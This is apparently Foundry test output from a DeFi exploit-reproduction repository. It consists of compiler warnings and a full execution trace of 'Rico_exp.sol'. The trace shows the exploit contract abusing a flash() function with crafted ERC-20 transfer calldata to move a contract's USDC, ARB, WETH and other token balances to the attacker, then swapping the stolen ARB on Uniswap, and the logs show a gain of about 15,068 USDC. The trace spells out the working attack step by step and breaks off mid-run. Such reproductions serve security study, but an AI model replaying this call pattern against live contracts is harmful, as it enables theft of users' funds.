Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.18s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 233.13ms (166.96µs CPU time)

Ran 1 test for src/test/2024-04/Rico_exp.sol:Rico
[PASS] testExploit() (gas: 1253749)
Logs:
  Attacker USDC Balance Before exploit: 0.000000
  Attacker USDC Balance After exploit: 15068.068008

Traces:
  [1572452] Rico::testExploit()
    ├─ [9750] 0xaf88d065e77c8cC2239327C5EDb3A432268e5831::balanceOf(Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   ├─ [2553] 0x86E721b43d4ECFa71119Dd38c0f938A75Fdb57B3::balanceOf(Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ emit log_named_decimal_uint(key: "Attacker USDC Balance Before exploit", val: 0, decimals: 6)
    ├─ [3250] 0xaf88d065e77c8cC2239327C5EDb3A432268e5831::balanceOf(0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b) [staticcall]
    │   ├─ [2553] 0x86E721b43d4ECFa71119Dd38c0f938A75Fdb57B3::balanceOf(0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b) [delegatecall]
    │   │   └─ ← [Return] 10375584869 [1.037e10]
    │   └─ ← [Return] 10375584869 [1.037e10]
    ├─ [99459] 0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b::flash(0xaf88d065e77c8cC2239327C5EDb3A432268e5831, 0xa9059cbb0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000026a6edc65)
    │   ├─ [94198] 0xc6D7b37FE18A3Dd007F9b1C3b339B8c6043b3ccf::flash(0xaf88d065e77c8cC2239327C5EDb3A432268e5831, 0xa9059cbb0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000026a6edc65) [delegatecall]
    │   │   ├─ [31621] 0x5374EcC160A4bd68446B43B5A6B132F9c001C54C::mint(0xaf88d065e77c8cC2239327C5EDb3A432268e5831, 340282366920938463463374607431768211456 [3.402e38])
    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0xaf88d065e77c8cC2239327C5EDb3A432268e5831, value: 340282366920938463463374607431768211456 [3.402e38])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [30063] 0xaf88d065e77c8cC2239327C5EDb3A432268e5831::transfer(Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10375584869 [1.037e10])
    │   │   │   ├─ [29363] 0x86E721b43d4ECFa71119Dd38c0f938A75Fdb57B3::transfer(Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10375584869 [1.037e10]) [delegatecall]
    │   │   │   │   ├─ emit Transfer(from: 0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b, to: Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 10375584869 [1.037e10])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Return] true
    │   │   ├─ [2913] 0x5374EcC160A4bd68446B43B5A6B132F9c001C54C::burn(0xaf88d065e77c8cC2239327C5EDb3A432268e5831, 340282366920938463463374607431768211456 [3.402e38])
    │   │   │   ├─ emit Transfer(from: 0xaf88d065e77c8cC2239327C5EDb3A432268e5831, to: 0x0000000000000000000000000000000000000000, value: 340282366920938463463374607431768211456 [3.402e38])
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    ├─ [9820] 0x912CE59144191C1204E64559FE8253a0e49E6548::balanceOf(0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b) [staticcall]
    │   ├─ [2580] 0xC4ed0A9Ea70d5bCC69f748547650d32cC219D882::balanceOf(0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b) [delegatecall]
    │   │   └─ ← [Return] 2478235540754361715555 [2.478e21]
    │   └─ ← [Return] 2478235540754361715555 [2.478e21]
    ├─ [67651] 0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b::flash(0x912CE59144191C1204E64559FE8253a0e49E6548, 0xa9059cbb0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000086586d4e0fbbd38b63)
    │   ├─ [66890] 0xc6D7b37FE18A3Dd007F9b1C3b339B8c6043b3ccf::flash(0x912CE59144191C1204E64559FE8253a0e49E6548, 0xa9059cbb0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000086586d4e0fbbd38b63) [delegatecall]
    │   │   ├─ [27621] 0x5374EcC160A4bd68446B43B5A6B132F9c001C54C::mint(0x912CE59144191C1204E64559FE8253a0e49E6548, 340282366920938463463374607431768211456 [3.402e38])
    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x912CE59144191C1204E64559FE8253a0e49E6548, value: 340282366920938463463374607431768211456 [3.402e38])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [33155] 0x912CE59144191C1204E64559FE8253a0e49E6548::transfer(Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2478235540754361715555 [2.478e21])
    │   │   │   ├─ [32412] 0xC4ed0A9Ea70d5bCC69f748547650d32cC219D882::transfer(Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2478235540754361715555 [2.478e21]) [delegatecall]
    │   │   │   │   ├─ emit Transfer(from: 0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b, to: Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2478235540754361715555 [2.478e21])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Return] true
    │   │   ├─ [2913] 0x5374EcC160A4bd68446B43B5A6B132F9c001C54C::burn(0x912CE59144191C1204E64559FE8253a0e49E6548, 340282366920938463463374607431768211456 [3.402e38])
    │   │   │   ├─ emit Transfer(from: 0x912CE59144191C1204E64559FE8253a0e49E6548, to: 0x0000000000000000000000000000000000000000, value: 340282366920938463463374607431768211456 [3.402e38])
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    ├─ [12602] 0xf97f4df75117a78c1A5a0DBb814Af92458539FB4::balanceOf(0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b) [staticcall]
    │   ├─ [2337] 0xE72ba9418b5f2Ce0A6a40501Fe77c6839Aa37333::implementation() [staticcall]
    │   │   └─ ← [Return] 0x3f770Ac673856F105b586bb393d122721265aD46
    │   ├─ [2465] 0x3f770Ac673856F105b586bb393d122721265aD46::balanceOf(0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b) [delegatecall]
    │   │   └─ ← [Return] 69669705859926416088 [6.966e19]
    │   └─ ← [Return] 69669705859926416088 [6.966e19]
    ├─ [63723] 0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b::flash(0xf97f4df75117a78c1A5a0DBb814Af92458539FB4, 0xa9059cbb0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000003c6dc845a8add5ad8)
    │   ├─ [62962] 0xc6D7b37FE18A3Dd007F9b1C3b339B8c6043b3ccf::flash(0xf97f4df75117a78c1A5a0DBb814Af92458539FB4, 0xa9059cbb0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000003c6dc845a8add5ad8) [delegatecall]
    │   │   ├─ [27621] 0x5374EcC160A4bd68446B43B5A6B132F9c001C54C::mint(0xf97f4df75117a78c1A5a0DBb814Af92458539FB4, 340282366920938463463374607431768211456 [3.402e38])
    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0xf97f4df75117a78c1A5a0DBb814Af92458539FB4, value: 340282366920938463463374607431768211456 [3.402e38])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [29227] 0xf97f4df75117a78c1A5a0DBb814Af92458539FB4::transfer(Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 69669705859926416088 [6.966e19])
    │   │   │   ├─ [337] 0xE72ba9418b5f2Ce0A6a40501Fe77c6839Aa37333::implementation() [staticcall]
    │   │   │   │   └─ ← [Return] 0x3f770Ac673856F105b586bb393d122721265aD46
    │   │   │   ├─ [28087] 0x3f770Ac673856F105b586bb393d122721265aD46::transfer(Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 69669705859926416088 [6.966e19]) [delegatecall]
    │   │   │   │   ├─ emit Transfer(from: 0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b, to: Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 69669705859926416088 [6.966e19])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Return] true
    │   │   ├─ [2913] 0x5374EcC160A4bd68446B43B5A6B132F9c001C54C::burn(0xf97f4df75117a78c1A5a0DBb814Af92458539FB4, 340282366920938463463374607431768211456 [3.402e38])
    │   │   │   ├─ emit Transfer(from: 0xf97f4df75117a78c1A5a0DBb814Af92458539FB4, to: 0x0000000000000000000000000000000000000000, value: 340282366920938463463374607431768211456 [3.402e38])
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    ├─ [7577] 0x5979D7b546E38E414F7E9822514be443A4800529::balanceOf(0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b) [staticcall]
    │   ├─ [2530] 0x0fBcbaEA96Ce0cF7Ee00A8c19c3ab6f5Dc8E1921::balanceOf(0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b) [delegatecall]
    │   │   └─ ← [Return] 266618989782460718 [2.666e17]
    │   └─ ← [Return] 266618989782460718 [2.666e17]
    ├─ [62933] 0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b::flash(0x5979D7b546E38E414F7E9822514be443A4800529, 0xa9059cbb0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000003b3388f005b692e)
    │   ├─ [62172] 0xc6D7b37FE18A3Dd007F9b1C3b339B8c6043b3ccf::flash(0x5979D7b546E38E414F7E9822514be443A4800529, 0xa9059cbb0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000003b3388f005b692e) [delegatecall]
    │   │   ├─ [27621] 0x5374EcC160A4bd68446B43B5A6B132F9c001C54C::mint(0x5979D7b546E38E414F7E9822514be443A4800529, 340282366920938463463374607431768211456 [3.402e38])
    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x5979D7b546E38E414F7E9822514be443A4800529, value: 340282366920938463463374607431768211456 [3.402e38])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [28437] 0x5979D7b546E38E414F7E9822514be443A4800529::transfer(Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 266618989782460718 [2.666e17])
    │   │   │   ├─ [27866] 0x0fBcbaEA96Ce0cF7Ee00A8c19c3ab6f5Dc8E1921::transfer(Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 266618989782460718 [2.666e17]) [delegatecall]
    │   │   │   │   ├─ emit Transfer(from: 0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b, to: Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 266618989782460718 [2.666e17])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Return] true
    │   │   ├─ [2913] 0x5374EcC160A4bd68446B43B5A6B132F9c001C54C::burn(0x5979D7b546E38E414F7E9822514be443A4800529, 340282366920938463463374607431768211456 [3.402e38])
    │   │   │   ├─ emit Transfer(from: 0x5979D7b546E38E414F7E9822514be443A4800529, to: 0x0000000000000000000000000000000000000000, value: 340282366920938463463374607431768211456 [3.402e38])
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    ├─ [9796] 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1::balanceOf(0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b) [staticcall]
    │   ├─ [2553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b) [delegatecall]
    │   │   └─ ← [Return] 287173939050505854 [2.871e17]
    │   └─ ← [Return] 287173939050505854 [2.871e17]
    ├─ [63396] 0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b::flash(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1, 0xa9059cbb0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000003fc3f2d11dae67e)
    │   ├─ [62635] 0xc6D7b37FE18A3Dd007F9b1C3b339B8c6043b3ccf::flash(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1, 0xa9059cbb0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000003fc3f2d11dae67e) [delegatecall]
    │   │   ├─ [27621] 0x5374EcC160A4bd68446B43B5A6B132F9c001C54C::mint(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1, 340282366920938463463374607431768211456 [3.402e38])
    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1, value: 340282366920938463463374607431768211456 [3.402e38])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [28900] 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1::transfer(Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 287173939050505854 [2.871e17])
    │   │   │   ├─ [28154] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::transfer(Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 287173939050505854 [2.871e17]) [delegatecall]
    │   │   │   │   ├─ emit Transfer(from: 0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b, to: Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 287173939050505854 [2.871e17])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Return] true
    │   │   ├─ [2913] 0x5374EcC160A4bd68446B43B5A6B132F9c001C54C::burn(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1, 340282366920938463463374607431768211456 [3.402e38])
    │   │   │   ├─ emit Transfer(from: 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1, to: 0x0000000000000000000000000000000000000000, value: 340282366920938463463374607431768211456 [3.402e38])
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    ├─ [9796] 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8::balanceOf(0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b) [staticcall]
    │   ├─ [2553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b) [delegatecall]
    │   │   └─ ← [Return] 300000000 [3e8]
    │   └─ ← [Return] 300000000 [3e8]
    ├─ [69893] 0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b::flash(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8, 0xa9059cbb0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000011e1a300)
    │   ├─ [69132] 0xc6D7b37FE18A3Dd007F9b1C3b339B8c6043b3ccf::flash(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8, 0xa9059cbb0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000011e1a300) [delegatecall]
    │   │   ├─ [27621] 0x5374EcC160A4bd68446B43B5A6B132F9c001C54C::mint(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8, 340282366920938463463374607431768211456 [3.402e38])
    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8, value: 340282366920938463463374607431768211456 [3.402e38])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [35397] 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8::transfer(Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 300000000 [3e8])
    │   │   │   ├─ [34651] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::transfer(Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 300000000 [3e8]) [delegatecall]
    │   │   │   │   ├─ emit Transfer(from: 0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b, to: Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 300000000 [3e8])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Return] true
    │   │   ├─ [2913] 0x5374EcC160A4bd68446B43B5A6B132F9c001C54C::burn(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8, 340282366920938463463374607431768211456 [3.402e38])
    │   │   │   ├─ emit Transfer(from: 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8, to: 0x0000000000000000000000000000000000000000, value: 340282366920938463463374607431768211456 [3.402e38])
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    ├─ [1250] 0xaf88d065e77c8cC2239327C5EDb3A432268e5831::balanceOf(0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b) [staticcall]
    │   ├─ [553] 0x86E721b43d4ECFa71119Dd38c0f938A75Fdb57B3::balanceOf(0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [3359] 0xaf88d065e77c8cC2239327C5EDb3A432268e5831::allowance(0x512E07A093aAA20Ba288392EaDF03838C7a4e522, 0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b) [staticcall]
    │   ├─ [2659] 0x86E721b43d4ECFa71119Dd38c0f938A75Fdb57B3::allowance(0x512E07A093aAA20Ba288392EaDF03838C7a4e522, 0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b) [delegatecall]
    │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007903129639935 [1.157e77]
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007903129639935 [1.157e77]
    ├─ [1250] 0xaf88d065e77c8cC2239327C5EDb3A432268e5831::balanceOf(0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b) [staticcall]
    │   ├─ [553] 0x86E721b43d4ECFa71119Dd38c0f938A75Fdb57B3::balanceOf(0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [3359] 0xaf88d065e77c8cC2239327C5EDb3A432268e5831::allowance(0x83eCCb05386B2d10D05e1BaEa8aC89b5B7EA8290, 0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b) [staticcall]
    │   ├─ [2659] 0x86E721b43d4ECFa71119Dd38c0f938A75Fdb57B3::allowance(0x83eCCb05386B2d10D05e1BaEa8aC89b5B7EA8290, 0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b) [delegatecall]
    │   │   └─ ← [Return] 1000000000 [1e9]
    │   └─ ← [Return] 1000000000 [1e9]
    ├─ [1077] 0x5979D7b546E38E414F7E9822514be443A4800529::balanceOf(0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b) [staticcall]
    │   ├─ [530] 0x0fBcbaEA96Ce0cF7Ee00A8c19c3ab6f5Dc8E1921::balanceOf(0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [3306] 0x5979D7b546E38E414F7E9822514be443A4800529::allowance(0x7b782A4D552a8ceB3924005a786a1a358BA63f71, 0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b) [staticcall]
    │   ├─ [2735] 0x0fBcbaEA96Ce0cF7Ee00A8c19c3ab6f5Dc8E1921::allowance(0x7b782A4D552a8ceB3924005a786a1a358BA63f71, 0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b) [delegatecall]
    │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    ├─ [1320] 0x912CE59144191C1204E64559FE8253a0e49E6548::balanceOf(Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   ├─ [580] 0xC4ed0A9Ea70d5bCC69f748547650d32cC219D882::balanceOf(Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   └─ ← [Return] 2478235540754361715555 [2.478e21]
    │   └─ ← [Return] 2478235540754361715555 [2.478e21]
    ├─ [25348] 0x912CE59144191C1204E64559FE8253a0e49E6548::approve(0xE592427A0AEce92De3Edee1F18E0157C05861564, 2478235540754361715555 [2.478e21])
    │   ├─ [24626] 0xC4ed0A9Ea70d5bCC69f748547650d32cC219D882::approve(0xE592427A0AEce92De3Edee1F18E0157C05861564, 2478235540754361715555 [2.478e21]) [delegatecall]
    │   │   ├─ emit Approval(owner: Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0xE592427A0AEce92De3Edee1F18E0157C05861564, value: 2478235540754361715555 [2.478e21])
    │   │   └─ ← [Return] true
    │   └─ ← [Return] true
    ├─ [109000] 0xE592427A0AEce92De3Edee1F18E0157C05861564::exactInputSingle(ExactInputSingleParams({ tokenIn: 0x912CE59144191C1204E64559FE8253a0e49E6548, tokenOut: 0xaf88d065e77c8cC2239327C5EDb3A432268e5831, fee: 3000, recipient: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, deadline: 1713616643 [1.713e9], amountIn: 2478235540754361715555 [2.478e21], amountOutMinimum: 0, sqrtPriceLimitX96: 0 }))
    │   ├─ [101568] 0xaEBDcA1Bc8d89177EbE2308d62af5e74885DcCc3::swap(Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], true, 2478235540754361715555 [2.478e21], 4295128740 [4.295e9], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002b912ce59144191c1204e64559fe8253a0e49e6548000bb8af88d065e77c8cc2239327c5edb3a432268e5831000000000000000000000000000000000000000000)
    │   │   ├─ [10163] 0xaf88d065e77c8cC2239327C5EDb3A432268e5831::transfer(Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2792982688 [2.792e9])
    │   │   │   ├─ [9463] 0x86E721b43d4ECFa71119Dd38c0f938A75Fdb57B3::transfer(Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2792982688 [2.792e9]) [delegatecall]
    │   │   │   │   ├─ emit Transfer(from: 0xaEBDcA1Bc8d89177EbE2308d62af5e74885DcCc3, to: Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2792982688 [2.792e9])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Return] true
    │   │   ├─ [3320] 0x912CE59144191C1204E64559FE8253a0e49E6548::balanceOf(0xaEBDcA1Bc8d89177EbE2308d62af5e74885DcCc3) [staticcall]
    │   │   │   ├─ [2580] 0xC4ed0A9Ea70d5bCC69f748547650d32cC219D882::balanceOf(0xaEBDcA1Bc8d89177EbE2308d62af5e74885DcCc3) [delegatecall]
    │   │   │   │   └─ ← [Return] 155732704212549553908299 [1.557e23]
    │   │   │   └─ ← [Return] 155732704212549553908299 [1.557e23]
    │   │   ├─ [15915] 0xE592427A0AEce92De3Edee1F18E0157C05861564::uniswapV3SwapCallback(2478235540754361715555 [2.478e21], -2792982688 [-2.792e9], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002b912ce59144191c1204e64559fe8253a0e49e6548000bb8af88d065e77c8cc2239327c5edb3a432268e5831000000000000000000000000000000000000000000)
    │   │   │   ├─ [11859] 0x912CE59144191C1204E64559FE8253a0e49E6548::transferFrom(Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xaEBDcA1Bc8d89177EbE2308d62af5e74885DcCc3, 2478235540754361715555 [2.478e21])
    │   │   │   │   ├─ [11131] 0xC4ed0A9Ea70d5bCC69f748547650d32cC219D882::transferFrom(Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xaEBDcA1Bc8d89177EbE2308d62af5e74885DcCc3, 2478235540754361715555 [2.478e21]) [delegatecall]
    │   │   │   │   │   ├─ emit Approval(owner: Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0xE592427A0AEce92De3Edee1F18E0157C05861564, value: 0)
    │   │   │   │   │   ├─ emit Transfer(from: Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xaEBDcA1Bc8d89177EbE2308d62af5e74885DcCc3, value: 2478235540754361715555 [2.478e21])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [1320] 0x912CE59144191C1204E64559FE8253a0e49E6548::balanceOf(0xaEBDcA1Bc8d89177EbE2308d62af5e74885DcCc3) [staticcall]
    │   │   │   ├─ [580] 0xC4ed0A9Ea70d5bCC69f748547650d32cC219D882::balanceOf(0xaEBDcA1Bc8d89177EbE2308d62af5e74885DcCc3) [delegatecall]
    │   │   │   │   └─ ← [Return] 158210939753303915623854 [1.582e23]
    │   │   │   └─ ← [Return] 158210939753303915623854 [1.582e23]
    │   │   ├─ emit Swap(param0: 0xE592427A0AEce92De3Edee1F18E0157C05861564, param1: Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 2478235540754361715555 [2.478e21], param3: -2792982688 [-2.792e9], param4: 84062149682792294526210 [8.406e22], param5: 632371795315051418 [6.323e17], param6: -275140 [-2.751e5])
    │   │   └─ ← [Return] 2478235540754361715555 [2.478e21], -2792982688 [-2.792e9]
    │   └─ ← [Return] 2792982688 [2.792e9]
    ├─ [1602] 0xf97f4df75117a78c1A5a0DBb814Af92458539FB4::balanceOf(Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
